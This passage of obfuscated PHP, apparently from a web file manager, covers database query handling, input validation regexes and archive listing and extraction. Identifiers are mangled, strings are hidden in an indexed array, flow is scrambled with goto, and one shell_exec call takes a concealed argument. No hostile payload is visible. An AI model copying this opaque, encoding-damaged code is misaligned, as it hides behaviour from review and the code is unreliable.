$d®®ÇÕïèµ = $AÒÂéƒ¯¦³[798] . $bÎÁ¿â´¹«; } else { $d®®ÇÕïèµ = $AÒÂéƒ¯¦³[799]; } } } $DÇïíùÀÉí = $this->query($d®®ÇÕïèµ); $BÃÄ©ğÇ‰ğ = array(); foreach ($DÇïíùÀÉí as $A›§„ÆÌòŠ => $BËã¨î”­¥) { $BÃÄ©ğÇ‰ğ[$A›§„ÆÌòŠ] = current($BËã¨î”­¥); } return $BÃÄ©ğÇ‰ğ; } protected function parseLimit($Døå·èÊ½‹) { $e—­èÓÜÚ =& $_SERVER[“]; $FªˆìŠ²‘Å = $e—­èÓÜÚ[33]; if (!empty($Døå·èÊ½‹)) { switch ($this->dbType) { case $e—­èÓÜÚ[842]: case $e—­èÓÜÚ[834]: $Døå·èÊ½‹ = explode($e—­èÓÜÚ[47], $Døå·èÊ½‹); if (count($Døå·èÊ½‹) > 1) { $FªˆìŠ²‘Å .= $e—­èÓÜÚ[48] . $Døå·èÊ½‹[1] . $e—­èÓÜÚ[49] . $Døå·èÊ½‹[0] . $e—­èÓÜÚ[50]; } else { $FªˆìŠ²‘Å .= $e—­èÓÜÚ[48] . $Døå·èÊ½‹[0] . $e—­èÓÜÚ[50]; } break; case $e—­èÓÜÚ[815]: case $e—­èÓÜÚ[833]: break; case $e—­èÓÜÚ[817]: break; case $e—­èÓÜÚ[816]: case $e—­èÓÜÚ[818]: break; case $e—­èÓÜÚ[845]: default: $FªˆìŠ²‘Å .= $e—­èÓÜÚ[48] . $Døå·èÊ½‹ . $e—­èÓÜÚ[50]; } } return $FªˆìŠ²‘Å; } public function parseKey(&$EìòèİŠŒË, $F‹‚ËË‰ğ† = true) { $cíŸ†ğ»Ô‹ =& $_SERVER[“]; if ($F‹‚ËË‰ğ†) { $EìòèİŠŒË = $this->parseKeyCheck($EìòèİŠŒË); } if ($this->dbType == $cíŸ†ğ»Ô‹[845]) { if ($EìòèİŠŒË != $cíŸ†ğ»Ô‹[176] && !preg_match($cíŸ†ğ»Ô‹[809], $EìòèİŠŒË)) { $EìòèİŠŒË = $cíŸ†ğ»Ô‹[810] . trim($EìòèİŠŒË, $cíŸ†ğ»Ô‹[810]) . $cíŸ†ğ»Ô‹[810]; } return $EìòèİŠŒË; } else { return parent::parseKey($EìòèİŠŒË); } } public function close() { $this->_linkID = null; } public function error() { $a‚Ú¬ªîñ =& $_SERVER[“]; if ($this->PDOStatement) { $B¸’¦šùŞ = $this->PDOStatement->errorInfo(); $this->error = $B¸’¦šùŞ[1] . $a‚Ú¬ªîñ[4] . $B¸’¦šùŞ[2]; } else { $this->error = $a‚Ú¬ªîñ[33]; } if ($a‚Ú¬ªîñ[33] != $this->queryStr) { $this->error .= LNG($a‚Ú¬ªîñ[45]) . $this->queryStr; } think_trace($this->error, $a‚Ú¬ªîñ[33], $a‚Ú¬ªîñ[46]); return $this->error; } public function escapeString($A¡ŒÍÀç¶·) { $C“ƒŒ–»Ã‚ =& $_SERVER[“]; switch ($this->dbType) { case $C“ƒŒ–»Ã‚[842]: case $C“ƒŒ–»Ã‚[815]: case $C“ƒŒ–»Ã‚[833]: case $C“ƒŒ–»Ã‚[845]: return addslashes($A¡ŒÍÀç¶·); case $C“ƒŒ–»Ã‚[817]: case $C“ƒŒ–»Ã‚[834]: case $C“ƒŒ–»Ã‚[816]: case $C“ƒŒ–»Ã‚[818]: return str_ireplace($C“ƒŒ–»Ã‚[55], $C“ƒŒ–»Ã‚[56], $A¡ŒÍÀç¶·); } } protected function parseValue($fÈóƒÎ¤¯Œ) { $Aö²÷Ê˜¸‹ =& $_SERVER[“]; if (is_string($fÈóƒÎ¤¯Œ)) { $fÈóƒÎ¤¯Œ = strpos($fÈóƒÎ¤¯Œ, $Aö²÷Ê˜¸‹[4]) === 0 ? $this->escapeString($fÈóƒÎ¤¯Œ) : $Aö²÷Ê˜¸‹[855] . $this->escapeString($fÈóƒÎ¤¯Œ) . $Aö²÷Ê˜¸‹[855]; } elseif (isset($fÈóƒÎ¤¯Œ[0]) && is_string($fÈóƒÎ¤¯Œ[0]) && strtolower($fÈóƒÎ¤¯Œ[0]) == $Aö²÷Ê˜¸‹[285]) { $fÈóƒÎ¤¯Œ = $this->escapeString($fÈóƒÎ¤¯Œ[1]); } elseif (is_array($fÈóƒÎ¤¯Œ)) { $fÈóƒÎ¤¯Œ = array_map(array($this, $Aö²÷Ê˜¸‹[856]), $fÈóƒÎ¤¯Œ); } elseif (is_bool($fÈóƒÎ¤¯Œ)) { $fÈóƒÎ¤¯Œ = $fÈóƒÎ¤¯Œ ? $Aö²÷Ê˜¸‹[83] : $Aö²÷Ê˜¸‹[470]; } elseif (is_null($fÈóƒÎ¤¯Œ)) { $fÈóƒÎ¤¯Œ = $Aö²÷Ê˜¸‹[99]; } return $fÈóƒÎ¤¯Œ; } public function getLastInsertId() { $Aåàà·¢½ò =& $_SERVER[“]; switch ($this->dbType) { case $Aåàà·¢½ò[842]: case $Aåàà·¢½ò[834]: case $Aåàà·¢½ò[815]: case $Aåàà·¢½ò[833]: case $Aåàà·¢½ò[817]: case $Aåàà·¢½ò[845]: return $this->_linkID->lastInsertId(); case $Aåàà·¢½ò[816]: case $Aåàà·¢½ò[818]: $c¥Ñ³Îˆ¦ƒ = $this->table; $Fãğ¨éëà = $this->query("\123\105\x4c\105\103\x54\40{$c¥Ñ³Îˆ¦ƒ}\x2e\143\x75\162\162\x76\141\x6c\x20\x63\x75\162\162\x76\141\x6c\40\106\122\x4f\x4d\x20\x64\x75\x61\x6c"); return $Fãğ¨éëà ? $Fãğ¨éëà[0][$Aåàà·¢½ò[857]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($a»õ¸İåˆ) { goto fï¾×Ïš; Cïò¤¶òâã: if (!$CëØó”­åš) { return !1; } if (flock($CëØó”­åš, LOCK_EX)) { $aãÖ¢‰Ì¨‚ = parent::query($a»õ¸İåˆ); flock($CëØó”­åš, LOCK_UN); fclose($CëØó”­åš); return $aãÖ¢‰Ì¨‚; } flock($CëØó”­åš, LOCK_UN); goto cíÆä§Ô¥ó; fï¾×Ïš: $CÆ¡ñä¿Ä  =& $_SERVER[“]; $aæÓ½êõˆ§ = DATA_PATH . $CÆ¡ñä¿Ä [858]; $CëØó”­åš = fopen($aæÓ½êõˆ§, $CÆ¡ñä¿Ä [859]); goto Cïò¤¶òâã; cíÆä§Ô¥ó: fclose($CëØó”­åš); show_json($CÆ¡ñä¿Ä [860], !1); return !1; goto f’ŒÓ¹µ“; f’ŒÓ¹µ“: } public function execute($E•¹Â¯Êâ) { goto bÜÀË¿ë¾´; bÜÀË¿ë¾´: $Cé‡Í—ğİ« =& $_SERVER[“]; $añ®›Èäï = DATA_PATH . $Cé‡Í—ğİ«[858]; $cÓ’ÖÒ õ = fopen($añ®›Èäï, $Cé‡Í—ğİ«[859]); goto CËµìŸ£áÚ; f•™¨¯ó¼Ø: fclose($cÓ’ÖÒ õ); show_json($Cé‡Í—ğİ«[860], !1); return !1; goto A³Ïå“…Ë; CËµìŸ£áÚ: if (!$cÓ’ÖÒ õ) { return !1; } if (flock($cÓ’ÖÒ õ, LOCK_EX)) { $FÉËÆ´–£ = parent::execute($E•¹Â¯Êâ); flock($cÓ’ÖÒ õ, LOCK_UN); fclose($cÓ’ÖÒ õ); return $FÉËÆ´–£; } flock($cÓ’ÖÒ õ, LOCK_UN); goto f•™¨¯ó¼Ø; A³Ïå“…Ë: } } goto aÕ¦åŸæÅã; eòåÚ¬ÇôÒ: if (!function_exists($_SERVER[“][1866])) { function imagecreatefrombmp($BƒÚß®„˜Ü) { return ImageGdBMP::load($BƒÚß®„˜Ü); } } class Input { public static function getArray($fÒ”õòÀƒâ) { goto E½¯ÓÉ¿Á; CŞ÷¶«»…‰: if (count($AõÂÂ¼ ¢š) > 0) { show_json(implode($d¾Õ•çø­[1871], $AõÂÂ¼ ¢š), !1); } return $cßÃ¹Î‹Ö; goto e¬”Ğóá´ì; A°‡Ï¡•ØŒ: $AõÂÂ¼ ¢š = array(); $fé¢öŠ¾ó• = LNG($d¾Õ•çø­[1867]); foreach ($fÒ”õòÀƒâ as $FŒ¸öÉÅÃ… => $c ˆ´ÎŞš…) { goto F†–ñÕ‰¯‰; F†–ñÕ‰¯‰: $d¢ï«ÈŠŞ = _get($c ˆ´ÎŞš…, $d¾Õ•çø­[1233], $fé¢öŠ¾ó• . $d¾Õ•çø­[866] . $FŒ¸öÉÅÃ…); $DÁõÓÃ¥ê¡ = $FŒ¸öÉÅÃ…; if (isset($c ˆ´ÎŞš…[$d¾Õ•çø­[1868]]) && $c ˆ´ÎŞš…[$d¾Õ•çø­[1868]]) { $DÁõÓÃ¥ê¡ = $c ˆ´ÎŞš…[$d¾Õ•çø­[1868]]; } goto eƒ°ƒå¦; Bâ’ïÖŞ†: if (isset($c ˆ´ÎŞš…[$d¾Õ•çø­[1870]]) && !self::check($in[$FŒ¸öÉÅÃ…], $c ˆ´ÎŞš…[$d¾Õ•çø­[1870]], $f³Ø¶…îÅ)) { if (array_key_exists($d¾Õ•çø­[1869], $c ˆ´ÎŞš…)) { if (!is_null($c ˆ´ÎŞš…[$d¾Õ•çø­[1869]])) { $cßÃ¹Î‹Ö[$DÁõÓÃ¥ê¡] = $c ˆ´ÎŞš…[$d¾Õ•çø­[1869]]; } } else { $AõÂÂ¼ ¢š[] = $d¢ï«ÈŠŞ; } continue; } $cßÃ¹Î‹Ö[$DÁõÓÃ¥ê¡] = $in[$FŒ¸öÉÅÃ…]; goto B’Á¼Œê¿ï; eƒ°ƒå¦: if (!array_key_exists($FŒ¸öÉÅÃ…, $in)) { if (array_key_exists($d¾Õ•çø­[1869], $c ˆ´ÎŞš…)) { if (!is_null($c ˆ´ÎŞš…[$d¾Õ•çø­[1869]])) { $cßÃ¹Î‹Ö[$DÁõÓÃ¥ê¡] = $c ˆ´ÎŞš…[$d¾Õ•çø­[1869]]; } } else { if (isset($c ˆ´ÎŞš…[$d¾Õ•çø­[1870]])) { $AõÂÂ¼ ¢š[] = $d¢ï«ÈŠŞ; } } continue; } if (isset($c ˆ´ÎŞš…[$d¾Õ•çø­[1870]]) && $c ˆ´ÎŞš…[$d¾Õ•çø­[1870]] == $d¾Õ•çø­[282]) { $Dî²ºÀâ’Ö = json_decode($in[$FŒ¸öÉÅÃ…], !0); if (is_array($Dî²ºÀâ’Ö)) { $cßÃ¹Î‹Ö[$DÁõÓÃ¥ê¡] = $Dî²ºÀâ’Ö; } else { if (array_key_exists($d¾Õ•çø­[1869], $c ˆ´ÎŞš…)) { if (!is_null($c ˆ´ÎŞš…[$d¾Õ•çø­[1869]])) { $cßÃ¹Î‹Ö[$DÁõÓÃ¥ê¡] = $c ˆ´ÎŞš…[$d¾Õ•çø­[1869]]; } } else { $AõÂÂ¼ ¢š[] = $d¢ï«ÈŠŞ; } } continue; } $f³Ø¶…îÅ = _get($c ˆ´ÎŞš…, $d¾Õ•çø­[999]); goto Bâ’ïÖŞ†; B’Á¼Œê¿ï: } goto CŞ÷¶«»…‰; E½¯ÓÉ¿Á: $d¾Õ•çø­ =& $_SERVER[“]; global $in; $cßÃ¹Î‹Ö = array(); goto A°‡Ï¡•ØŒ; e¬”Ğóá´ì: } public static function reg($BÎ¦¶Ã§ß = "\162\145\161\165\151\x72\x65") { static $Aèì®§†×ø = array("\162\x65\x71\165\151\162\x65" => "\x2e\53", "\x6e\165\x6d\x62\x65\x72" => "\x5c\x64\53", "\x69\156\x74\x65\147\x65\x72" => "\134\x64\53", "\x68\x65\170" => "\x5b\x30\55\x39\x41\55\x46\x61\x2d\x66\135\53", "\x69\156\x74" => "\133\x2d\134\x2b\x5d\77\x5c\x64\53", "\142\x6f\157\x6c" => "\x30\174\x31", "\x66\154\157\x61\x74" => "\133\55\134\x2b\135\77\134\x64\x2b\50\134\x2e\x5c\x64\53\x29\x3f", "\x65\156\x67\x6c\151\x73\x68" => "\133\101\x2d\132\141\x2d\x7a\40\x5d\x2b", "\x63\150\151\156\x65\163\x65" => "\133\134\170\x7b\x34\x65\x30\60\x7d\x2d\x5c\x78\173\71\x66\141\x35\175\x5d\x2b", "\150\x61\163\x43\150\x69\156\145\163\x65" => "\x2f\x28\133\134\170\x7b\64\145\60\x30\175\55\134\170\x7b\71\146\x61\65\x7d\x5d\x2b\51\x2f\165", "\145\155\141\x69\154" => "\134\x77\x2b\50\133\134\56\x5c\55\135\x5c\167\53\x29\52\134\x40\x5c\x77\53\x28\x5b\134\56\134\x2d\x5d\x5c\167\53\51\x2a\x5c\56\134\x77\x2b", "\160\150\x6f\x6e\145" => "\x31\x5b\63\x2d\x39\135\134\x64\173\71\x7d", "\x74\145\x6c\x70\x68\157\156\145" => "\50\x5c\50\134\x64\173\63\54\x34\x7d\134\51\174\x5c\x64\x7b\x33\54\x34\x7d\x2d\174\134\163\51\x3f\x5c\144\173\x37\54\61\x34\175", "\165\x72\x6c" => "\50\150\164\x74\160\x7c\x66\x74\x70\x7c\x68\164\164\160\163\51\72\x5c\x2f\x5c\57\x5b\134\x77\x5c\55\137\135\53\x28\x5c\56\x5b\x5c\167\x5c\55\137\x5d\x2b\51\x2b\50\133\134\167\x5c\55\134\x2e\x2c\100\x3f\136\x3d\45\x26\72\134\x2f\176\x5c\53\x23\135\52\133\x5c\167\134\x2d\x5c\100\77\136\75\45\x26\x5c\x2f\176\x5c\53\x23\x5d\51\x3f", "\165\162\x6c\106\x75\154\x6c" => "\x5b\x61\x2d\172\x41\55\172\x5d\x2b\x3a\x5c\57\134\x2f\133\136\134\163\x5d\x2a", "\x69\x70" => "\x28\x5c\x64\173\x31\x2c\63\175\x5c\x2e\51\x7b\x33\x7d\50\x5c\144\173\x31\x2c\63\x7d\x29", "\x7a\151\160" => "\133\61\55\x39\135\134\x64\x7b\x35\x7d\50\x3f\x21\134\144\51", "\x69\x64\x43\141\x72\144" => "\50\x5c\144\x7b\61\65\x7d\51\x7c\x28\x5c\144\x7b\61\67\175\50\134\x64\x7c\130\x7c\x78\51\51", "\143\x6f\154\157\x72" => "\x23\50\133\x30\x2d\x39\x41\55\106\141\55\146\x5d\173\x33\x7d\x7c\x5b\60\x2d\71\101\x2d\x46\x61\x2d\x66\x5d\173\x36\175\51", "\x74\151\x6d\x65" => "\x28\133\60\55\61\135\x5c\144\x7c\x32\133\60\x2d\x34\135\x29\x3a\133\x30\55\x35\x5d\x5c\x64", "\144\141\x74\145" => "\x5c\144\x7b\64\175\133\x2d\x5c\x2f\135\x3f\x28\60\x5b\x31\x2d\x39\x5d\x7c\61\133\60\55\62\135\x29\133\x2d\x5c\57\x5d\x3f\x28\133\60\55\62\x5d\x5c\x64\x7c\x33\133\x30\55\61\135\51", "\144\141\x74\145\124\151\155\x65" => "\x5c\144\173\x34\x7d\133\x2d\134\57\135\x3f\x28\x30\133\61\55\71\x5d\x7c\61\x5b\60\x2d\x32\x5d\x29\133\55\x5c\x2f\135\x3f\x28\133\60\55\62\x5d\134\x64\174\x33\133\x30\x2d\61\x5d\x29\134\163\53\50\133\x30\x2d\x31\135\x5c\x64\174\62\x5b\x30\x2d\x34\135\51\72\x5b\x30\x2d\65\x5d\134\144", "\x70\x61\x73\163\167\157\x72\x64" => "\50\x3f\x3d\x2e\x2a\x5c\144\x29\50\77\75\x2e\x2a\133\x61\x2d\x7a\135\x29\50\77\75\x2e\x2a\x5b\101\x2d\x5a\x5d\x29\56\173\x38\54\x32\x30\175", "\x6b\145\x79" => "\x5b\x41\55\132\141\x2d\172\60\55\x39\137\x5c\x2d\x5c\56\x5d\x2b", "\153\145\171\106\x75\x6c\x6c" => "\x5b\101\x2d\132\141\x2d\172\60\x2d\71\x5f\134\55\x5c\56\x5c\163\54\x5d\x2b"); if (!$BÎ¦¶Ã§ß) { return $Aèì®§†×ø; } return $Aèì®§†×ø[$BÎ¦¶Ã§ß]; } public static function check($Dµ¾Ï¢‘Ö, $FêÓµ‰†­›, $bˆª¥öĞ  = null) { $FºÓË•àñ‹ =& $_SERVER[“]; switch ($FêÓµ‰†­›) { case $FºÓË•àñ‹[7]: return in_array($Dµ¾Ï¢‘Ö, $bˆª¥öĞ ); break; case $FºÓË•àñ‹[1872]: return floatval($Dµ¾Ï¢‘Ö) > $bˆª¥öĞ ; break; case $FºÓË•àñ‹[1873]: return floatval($Dµ¾Ï¢‘Ö) < $bˆª¥öĞ ; break; case $FºÓË•àñ‹[325]: return strlen($Dµ¾Ï¢‘Ö) >= $bˆª¥öĞ [0] && strlen($Dµ¾Ï¢‘Ö) <= $bˆª¥öĞ [1]; break; case $FºÓË•àñ‹[325]: if (is_array($bˆª¥öĞ )) { return strlen($Dµ¾Ï¢‘Ö) >= $bˆª¥öĞ [0] && strlen($Dµ¾Ï¢‘Ö) <= $bˆª¥öĞ [1]; break; } else { return strlen($Dµ¾Ï¢‘Ö) == $bˆª¥öĞ ; break; } case $FºÓË•àñ‹[321]: return floatval($Dµ¾Ï¢‘Ö) >= $bˆª¥öĞ [0] && floatval($Dµ¾Ï¢‘Ö) <= $bˆª¥öĞ [1]; break; } $Cİ’ŞÎ—Š = self::reg(!1); $FêÓµ‰†­› = isset($Cİ’ŞÎ—Š[$FêÓµ‰†­›]) ? $Cİ’ŞÎ—Š[$FêÓµ‰†­›] : $FêÓµ‰†­›; if (substr($FêÓµ‰†­›, 0, 1) != $FºÓË•àñ‹[8]) { $FêÓµ‰†­› = $FºÓË•àñ‹[1874] . $FêÓµ‰†­› . $FºÓË•àñ‹[1875]; } return preg_match($FêÓµ‰†­›, $Dµ¾Ï¢‘Ö) === 1; } public static function get($b¦Í­Ñºä, $B»Ÿ›é´Í— = null, $bãÖìà—§é = null, $C¢ª‹»¹ï² = null) { goto f¾ÔÛ¼ÕÀ; dÃ‚á‰Â: return $B¤ˆæÇÚÙ[$b¦Í­Ñºä]; goto e¨·‚‡¦; e°Üîù…Ş®: if (!is_null($C¢ª‹»¹ï²)) { $EŠÔÏƒÈŸô[$aãİµ‚’ÊÓ[999]] = $C¢ª‹»¹ï²; } if (!is_null($B»Ÿ›é´Í—)) { $EŠÔÏƒÈŸô[$aãİµ‚’ÊÓ[1870]] = $B»Ÿ›é´Í—; } $B¤ˆæÇÚÙ = Input::getArray(array($b¦Í­Ñºä => $EŠÔÏƒÈŸô)); goto dÃ‚á‰Â; f¾ÔÛ¼ÕÀ: $aãİµ‚’ÊÓ =& $_SERVER[“]; $EŠÔÏƒÈŸô = array(); if (!is_null($bãÖìà—§é)) { $EŠÔÏƒÈŸô[$aãİµ‚’ÊÓ[34]] = $bãÖìà—§é; } goto e°Üîù…Ş®; e¨·‚‡¦: } } class KodArchive { static function init() { goto E÷¿´©Ú”¨; bãÏ¯ï°¹°: define($c²ïºÈ­¸[1878], TEMP_FILES); define($c²ïºÈ­¸[1879], TEMP_FILES); define($c²ïºÈ­¸[1880], $c²ïºÈ­¸[1881]); goto d“‡œ¨áÔ; d“‡œ¨áÔ: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $c²ïºÈ­¸[1882]; require_once ARCHIVE_LIB . $c²ïºÈ­¸[1883]; goto d²ïë•²ŒÔ; dÑÙã’†ö: require_once ARCHIVE_LIB . $c²ïºÈ­¸[1887]; goto bˆ˜ÁÍŒ¼Ô; d²ïë•²ŒÔ: require_once ARCHIVE_LIB . $c²ïºÈ­¸[1884]; require_once ARCHIVE_LIB . $c²ïºÈ­¸[1885]; require_once ARCHIVE_LIB . $c²ïºÈ­¸[1886]; goto dÑÙã’†ö; E÷¿´©Ú”¨: $c²ïºÈ­¸ =& $_SERVER[“]; if (defined($c²ïºÈ­¸[1876])) { return; } define($c²ïºÈ­¸[1876], SDK_DIR . $c²ïºÈ­¸[1877]); goto bãÏ¯ï°¹°; bˆ˜ÁÍŒ¼Ô: } static function checkIfType($dáÕŒ…ò¬Ô, $D¹ˆ‘‡Ö¢) { goto eÀ¤ƒÁ˜Ú; fŠÓÖ“ÇÄ—: $eÀ“¡´œ³× = in_array($dáÕŒ…ò¬Ô, $eö¼¤’Ê¥§[$D¹ˆ‘‡Ö¢]); if ($eÀ“¡´œ³× && ($D¹ˆ‘‡Ö¢ == $eÌÑÊœ‘Ñ[301] || $D¹ˆ‘‡Ö¢ == $eÌÑÊœ‘Ñ[1891]) && (!function_exists($eÌÑÊœ‘Ñ[1899]) || !function_exists($eÌÑÊœ‘Ñ[1900]))) { show_tips($eÌÑÊœ‘Ñ[1901]); } if ($eÀ“¡´œ³× && $D¹ˆ‘‡Ö¢ == $eÌÑÊœ‘Ñ[1032] && (!function_exists($eÌÑÊœ‘Ñ[1902]) || !strstr(shell_exec($eÌÑÊœ‘Ñ[1903]), $eÌÑÊœ‘Ñ[1904]))) { show_tips($eÌÑÊœ‘Ñ[1905]); } goto D¡­¡‡ùÂ£; D¡­¡‡ùÂ£: return $eÀ“¡´œ³×; goto DŸîÕÀãÉ; eÀ¤ƒÁ˜Ú: $eÌÑÊœ‘Ñ =& $_SERVER[“]; self::init(); $eö¼¤’Ê¥§ = array($eÌÑÊœ‘Ñ[301] => array($eÌÑÊœ‘Ñ[301], $eÌÑÊœ‘Ñ[1888], $eÌÑÊœ‘Ñ[1889], $eÌÑÊœ‘Ñ[1890]), $eÌÑÊœ‘Ñ[1891] => array($eÌÑÊœ‘Ñ[1891], $eÌÑÊœ‘Ñ[1892], $eÌÑÊœ‘Ñ[1030], $eÌÑÊœ‘Ñ[1028]), $eÌÑÊœ‘Ñ[1032] => array($eÌÑÊœ‘Ñ[1032], $eÌÑÊœ‘Ñ[1893], $eÌÑÊœ‘Ñ[1894], $eÌÑÊœ‘Ñ[1895], $eÌÑÊœ‘Ñ[1896], $eÌÑÊœ‘Ñ[1897], $eÌÑÊœ‘Ñ[1898])); goto fŠÓÖ“ÇÄ—; DŸîÕÀãÉ: } static function listContent($eËåïÏ’Ÿ, $d±éƒˆ•¿ä = true) { $cÜå‘ñÙœ§ =& $_SERVER[“]; self::init(); $cÔåŠµíæ¹ = !empty($GLOBALS[$cÜå‘ñÙœ§[1036]]) ? $GLOBALS[$cÜå‘ñÙœ§[1036]] : get_path_ext($eËåïÏ’Ÿ); $c‘¼§¯õ–– = !1; if (self::checkIfType($cÔåŠµíæ¹, $cÜå‘ñÙœ§[1891])) { $f´ÁØƒÆØæ = PclTarList($eËåïÏ’Ÿ, $cÔåŠµíæ¹); $c‘¼§¯õ–– = array(); for ($fÂÇä‰´Ğ = 0; $fÂÇä‰´Ğ < count($f´ÁØƒÆØæ); $fÂÇä‰´Ğ++) { $aïØíóå“Î = $f´ÁØƒÆØæ[$fÂÇä‰´Ğ]; if ($aïØíóå“Î[$cÜå‘ñÙœ§[1906]] == $cÜå‘ñÙœ§[1907] || $aïØíóå“Î[$cÜå‘ñÙœ§[1906]] == $cÜå‘ñÙœ§[1908]) { continue; } if ($d±éƒˆ•¿ä) { $aïØíóå“Î[$cÜå‘ñÙœ§[1909]] = ltrim($aïØíóå“Î[$cÜå‘ñÙœ§[1909]], $cÜå‘ñÙœ§[1142]); } if ($aïØíóå“Î[$cÜå‘ñÙœ§[1906]] == $cÜå‘ñÙœ§[1910]) { $aïØíóå“Î[$cÜå‘ñÙœ§[76]] = !0; } else { $aïØíóå“Î[$cÜå‘ñÙœ§[76]] = !1; } $aïØíóå“Î[$cÜå‘ñÙœ§[1023]] = $fÂÇä‰´Ğ; $c‘¼§¯õ––[] = $aïØíóå“Î; } } else { if (self::checkIfType($cÔåŠµíæ¹, $cÜå‘ñÙœ§[1032])) { $BšŒğ„›­ = kodRarArchive::listContent($eËåïÏ’Ÿ); if (!$BšŒğ„›­[$cÜå‘ñÙœ§[1019]]) { return $BšŒğ„›­; } else { $c‘¼§¯õ–– = $BšŒğ„›­[$cÜå‘ñÙœ§[1021]]; } } else { if (kodZipArchive::support($cÜå‘ñÙœ§[354])) { $c‘¼§¯õ–– = kodZipArchive::listContent($eËåïÏ’Ÿ); } else { $cªîÕÅ’Ëİ = new PclZip($eËåïÏ’Ÿ); $c‘¼§¯õ–– = $cªîÕÅ’Ëİ->listContent(); } } } if ($c‘¼§¯õ––) { $EÚÉ‡Ì¹®ğ = unzip_charset_get($c‘¼§¯õ––); $d±éƒˆ•¿ä = $d±éƒˆ•¿ä && function_exists($cÜå‘ñÙœ§[65]); for ($fÂÇä‰´Ğ = 0; $fÂÇä‰´Ğ < count($c‘¼§¯õ––); $fÂÇä‰´Ğ++) { $c‘¼§¯õ––[$fÂÇä‰´Ğ][$cÜå‘ñÙœ§[1909]] = str_replace(array($cÜå‘ñÙœ§[1059], $cÜå‘ñÙœ§[1911]), $cÜå‘ñÙœ§[747], $c‘¼§¯õ––[$fÂÇä‰´Ğ][$cÜå‘ñÙœ§[1909]]); if ($d±éƒˆ•¿ä) { $c‘¼§¯õ––[$fÂÇä‰´Ğ][$cÜå‘ñÙœ§[1909]] = iconv_to($c‘¼§¯õ––[$fÂÇä‰´Ğ][$cÜå‘ñÙœ§[1909]], $EÚÉ‡Ì¹®ğ, $cÜå‘ñÙœ§[326]); unset($c‘¼§¯õ––[$fÂÇä‰´Ğ][$cÜå‘ñÙœ§[1912]]); } } return array($cÜå‘ñÙœ§[1019] => !0, $cÜå‘ñÙœ§[1021] => $c‘¼§¯õ––); } else { return array($cÜå‘ñÙœ§[1019] => !1, $cÜå‘ñÙœ§[1021] => $c‘¼§¯õ––); } } static function extract($fƒÎÍ±ºÒ×, $EÖ£ŸåÑ–Œ, $f‘¼Ğï»’¢ = "\55\x31", &$a«··¢¨‚¿ = false) { goto F’¹ôÜšÚŞ; FÇâÜ¥Ã¿·: $dŠ–óâ¬¿Ş = self::listContent($fƒÎÍ±ºÒ×, !1); if (!$dŠ–óâ¬¿Ş[$C°è¢Ç£[1019]]) { return $dŠ–óâ¬¿Ş; } if ($f‘¼Ğï»’¢ != $C°è¢Ç£[1018]) { goto C”»’æàŞ—; fëìÛ†Î¥·: if ($GLOBALS[$C°è¢Ç£[6]][$C°è¢Ç£[1140]] != $C°è¢Ç£[326]) { $A×‚»ƒËöÂ = unzip_pre_name($a«··¢¨‚¿); } $bŒ³‚»Ó» = get_path_father($a«··¢¨‚¿); if ($bŒ³‚»Ó» == $a«··¢¨‚¿) { $bŒ³‚»Ó» = $C°è¢Ç£[33]; } goto aÂñáùõí; aÂñáùõí: if ($dïâéƒ–ˆƒ[$C°è¢Ç£[76]]) { $A×‚»ƒËöÂ = rtrim($A×‚»ƒËöÂ, $C°è¢Ç£[8]) . $C°è¢Ç£[8]; $a«··¢¨‚¿ = array($a«··¢¨‚¿); } $Bœ†ë…„† = str_replace($C°è¢Ç£[93], $C°è¢Ç£[8], $A×‚»ƒËöÂ); if (substr($Bœ†ë…„†, -1) == $C°è¢Ç£[8]) { if (!strstr(trim($Bœ†ë…„†, $C°è¢Ç£[8]), $C°è¢Ç£[8])) { $EÖ£ŸåÑ–Œ = $EÖ£ŸåÑ–Œ . get_path_this($Bœ†ë…„†) . $C°è¢Ç£[8]; } } else { if ($bŒ³‚»Ó» == $A×‚»ƒËöÂ) { $bŒ³‚»Ó» = $C°è¢Ç£[33]; } } goto A¡øçœœÊ”; C”»’æàŞ—: $dïâéƒ–ˆƒ = self::fileIndex($dŠ–óâ¬¿Ş[$C°è¢Ç£[1021]], $f‘¼Ğï»’¢); $a«··¢¨‚¿ = str_replace(array($C°è¢Ç£[1059], $C°è¢Ç£[1911]), $C°è¢Ç£[70], $dïâéƒ–ˆƒ[$C°è¢Ç£[1909]]); $A×‚»ƒËöÂ = $a«··¢¨‚¿; goto fëìÛ†Î¥·; A¡øçœœÊ”: } goto Bó…½çĞÕ; Bó…½çĞÕ: if (self::checkIfType($BÍ·Œî…ç«, $C°è¢Ç£[1891])) { if ($f‘¼Ğï»’¢ != $C°è¢Ç£[1018]) { $A×‚»ƒËöÂ = unzip_pre_name($A×‚»ƒËöÂ); $bŒ³‚»Ó» = unzip_pre_name($bŒ³‚»Ó»); $bßÂ‘Î¡Ë = PclTarExtractList($fƒÎÍ±ºÒ×, array($A×‚»ƒËöÂ), $EÖ£ŸåÑ–Œ, $bŒ³‚»Ó», $BÍ·Œî…ç«); } else { $bßÂ‘Î¡Ë = PclTarExtract($fƒÎÍ±ºÒ×, $EÖ£ŸåÑ–Œ, $C°è¢Ç£[361], $BÍ·Œî…ç«); } return array($C°è¢Ç£[1019] => $bßÂ‘Î¡Ë, $C°è¢Ç£[1021] => PclErrorString(!0)); } else { if (self::checkIfType($BÍ·Œî…ç«, $C°è¢Ç£[1032])) { return kodRarArchive::extract($fƒÎÍ±ºÒ×, $EÖ£ŸåÑ–Œ, $BÍ·Œî…ç«, $a«··¢¨‚¿); } else { if (kodZipArchive::support($C°è¢Ç£[1913])) { return kodZipArchive::extract($fƒÎÍ±ºÒ×, $EÖ£ŸåÑ–Œ, $a«··¢¨‚¿); } else { $E…Ú“¯Ú¾ = new PclZip($fƒÎÍ±ºÒ×); if ($f‘¼Ğï»’¢ != $C°è¢Ç£[1018]) { $bßÂ‘Î¡Ë = $E…Ú“¯Ú¾->extract(PCLZIP_OPT_PATH, $EÖ£ŸåÑ–Œ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $C°è¢Ç£[1914], PCLZIP_OPT_BY_NAME, $dïâéƒ–ˆƒ[$C°è¢Ç£[1909]], PCLZIP_OPT_REMOVE_PATH, $bŒ³‚»Ó», PCLZIP_OPT_REPLACE_NEWER); } else { $bßÂ‘Î¡Ë = $E…Ú“¯Ú¾->extract(PCLZIP_OPT_PATH, $EÖ£ŸåÑ–Œ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, 